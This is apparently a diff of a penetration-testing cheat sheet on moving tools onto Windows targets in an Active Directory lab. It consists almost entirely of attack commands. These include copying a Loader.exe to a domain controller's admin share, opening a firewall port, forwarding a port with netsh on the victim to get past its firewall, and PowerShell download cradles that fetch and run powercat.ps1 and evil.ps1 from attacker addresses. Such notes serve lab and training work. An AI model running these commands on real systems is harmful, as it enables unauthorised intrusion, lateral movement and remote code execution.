@@ -8,16 +8,22 @@ echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
 
 ### HTTP Server
 
-Port forward to avoid firewall using netsh on target machine
-
-```batch
-netsh interface portproxy add v4tov4 listenport=8080 listenaddress=127.0.0.1 connectport=80 connectaddress=172.16.100.x
-```
-
 Serve the files using [hfs ](https://www.rejetto.com/hfs/?f=dl)or http simple server
 
 ```batch
+:: Attacker Machine
 python3 -m http.server -port 80
+:: Open the port where the files are hosted. Need Admin Access
+netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
+:: Verify if port is open or closed
+netstat -an
+```
+
+Port forward to avoid firewall using netsh on target machine
+
+```batch
+:: Victim Machine
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=127.0.0.1 connectport=80 connectaddress=172.16.100.x
 ```
 
 Download the file on target machine
@@ -53,6 +59,7 @@ $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil
 PowerShell v3+
 
 ```powershell
+# UseBasicParsing is important sometime
 iex (iwr http://172.16.100.83/powercat.ps1 -UseBasicParsing)
 iex (iwr 'http://192.168.230.1/evil.ps1')
 ```
